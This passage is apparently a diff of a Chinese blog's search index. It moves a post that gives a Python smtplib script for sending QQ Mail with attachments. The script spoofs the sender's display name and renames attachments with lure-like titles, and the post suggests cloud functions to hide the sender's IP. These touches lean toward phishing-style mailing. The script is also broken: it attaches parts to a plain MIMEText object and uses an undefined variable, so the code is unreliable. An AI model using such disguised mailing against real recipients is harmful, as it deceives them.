把内容添加到邮件中</span><br><span class="line">msg.attach(att1)</span><br><span class="line"></span><br><span class="line"># 图片附件</span><br><span class="line">att2 &#x3D; MIMEText(open(&quot;.&#x2F;4.png&quot;,&#39;rb&#39;).read(),&#39;plain&#39;,&#39;utf-8&#39;)</span><br><span class="line"></span><br><span class="line"># 添加头信息，我告诉服务器，我现在是一个附件</span><br><span class="line">att2[&#39;Content-Type&#39;]&#x3D;&#39;application&#x2F;octet-stream&#39;</span><br><span class="line">att2.add_header(&quot;Content-Disposition&quot;,&#39;attachment&#39;,filename&#x3D;(&#39;gbk&#39;,&quot;&quot;,&#39;小猪猪.png&#39;))</span><br><span class="line"># 把内容添加到邮件中</span><br><span class="line">msg.attach(att2)</span><br><span class="line">#连接服务器</span><br><span class="line">s&#x3D; smtplib.SMTP_SSL(&#39;smtp.qq.com&#39;,465)</span><br><span class="line"># 登陆我的邮箱</span><br><span class="line">s.login(email_name,passwd)</span><br><span class="line"># 发送邮箱</span><br><span class="line">s.sendmail(email_name,msg_to,msg.as_string())</span><br><span class="line">print(&quot;发送成功&quot;)</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>邮件</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>网络安全专业术语</title>
     <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD/</url>
     <content><![CDATA[<div class="note default simple"><h1 id="1-CMS"><a href="#1-CMS" class="headerlink" title="1.CMS"></a>1.CMS</h1></div>
@@ -610,23 +707,6 @@
       <categories>
         <category>web相关</category>
       </categories>
-  </entry>
-  <entry>
-    <title>邮件</title>
-    <url>/%E9%82%AE%E4%BB%B6/</url>
-    <content><![CDATA[<h1 id="邮件相关【杂】"><a href="#邮件相关【杂】" class="headerlink" title="邮件相关【杂】"></a>邮件相关【杂】</h1><h2 id="一、内网邮件服务器"><a href="#一、内网邮件服务器" class="headerlink" title="一、内网邮件服务器"></a>一、内网邮件服务器</h2><p>​    第三方软件HMailServer，可以很容易搭建内网邮件服务器 —适用于windows  亲测有效。留存。【很详细】</p>
-<p><a href="https://www.cnblogs.com/tiger-fu/p/7448005.html">https://www.cnblogs.com/tiger-fu/p/7448005.html</a></p>
-<p><a href="https://blog.csdn.net/gelupu/article/details/38325029">https://blog.csdn.net/gelupu/article/details/38325029</a></p>
-<h2 id="二、邮件"><a href="#二、邮件" class="headerlink" title="二、邮件"></a>二、邮件</h2><p>​    建议可以使用云函数发送，可以避免自身的真实IP泄露</p>
-<p>pyhon 发送邮箱【带附件】</p>
-<p>#注意模块的安装</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import smtplib</span><br><span class="line">from email.mime.text import MIMEText</span><br><span class="line">from email.mime.multipart import MIMEMultipart</span><br><span class="line">#输入发件人邮箱名称</span><br><span class="line">email_name &#x3D; &#39;邮箱【建议写自定义邮箱】&#39;</span><br><span class="line"># 输入用户授权码</span><br><span class="line">passwd &#x3D; &#39;授权码 QQ邮箱-账户&#39;</span><br><span class="line"># 收件人邮箱</span><br><span class="line">msg_to &#x3D; &#39;收件人邮箱&#39;</span><br><span class="line"># 邮件的正文</span><br><span class="line">content &#x3D; &quot;测试&quot;</span><br><span class="line"># 设置邮件</span><br><span class="line">msg &#x3D; MIMEText(content)</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;&quot;utf-8&quot;</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Transfer-Encoding: base64 5rWL6K+V</span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">msg[&#39;subject&#39;]&#x3D;&#39;嗷~&#39;</span><br><span class="line">#设置发件人</span><br><span class="line">msg[&#39;From&#39;]&#x3D; &#39;你隔壁的小王&#39;</span><br><span class="line"># 这个参数设置要发给谁</span><br><span class="line">msg[&#39;To&#39;] &#x3D; msg_to</span><br><span class="line">#添加附件内容</span><br><span class="line">msg.attach(content_part)</span><br><span class="line"></span><br><span class="line">#*********************构造附件***********</span><br><span class="line"># 文本类型的附件</span><br><span class="line">att1 &#x3D; MIMEText(open(&quot;.&#x2F;baidu.doc&quot;,&#39;rb&#39;).read(),&#39;plain&#39;,&#39;utf-8&#39;)</span><br><span class="line"></span><br><span class="line"># 添加头信息，我告诉服务器，我现在是一个附件</span><br><span class="line">att1[&#39;Content-Type&#39;]&#x3D;&#39;application&#x2F;octet-stream&#39;</span><br><span class="line">att1.add_header(&quot;Content-Disposition&quot;,&#39;attachment&#39;,filename&#x3D;(&#39;gbk&#39;,&quot;&quot;,&#39;学习最新信息.txt&#39;))</span><br><span class="line"># 把内容添加到邮件中</span><br><span class="line">msg.attach(att1)</span><br><span class="line"></span><br><span class="line"># 图片附件</span><br><span class="line">att2 &#x3D; MIMEText(open(&quot;.&#x2F;4.png&quot;,&#39;rb&#39;).read(),&#39;plain&#39;,&#39;utf-8&#39;)</span><br><span class="line"></span><br><span class="line"># 添加头信息，我告诉服务器，我现在是一个附件</span><br><span class="line">att2[&#39;Content-Type&#39;]&#x3D;&#39;application&#x2F;octet-stream&#39;</span><br><span class="line">att2.add_header(&quot;Content-Disposition&quot;,&#39;attachment&#39;,filename&#x3D;(&#39;gbk&#39;,&quot;&quot;,&#39;小猪猪.png&#39;))</span><br><span class="line"># 把内容添加到邮件中</span><br><span class="line">msg.attach(att2)</span><br><span class="line">#连接服务器</span><br><span class="line">s&#x3D; smtplib.SMTP_SSL(&#39;smtp.qq.com&#39;,465)</span><br><span class="line"># 登陆我的邮箱</span><br><span class="line">s.login(email_name,passwd)</span><br><span class="line"># 发送邮箱</span><br><span class="line">s.sendmail(email_name,msg_to,msg.as_string())</span><br><span class="line">print(&quot;发送成功&quot;)</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>邮件</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-      </tags>
   </entry>
   <entry>
     <title>pandas学习_01</title>
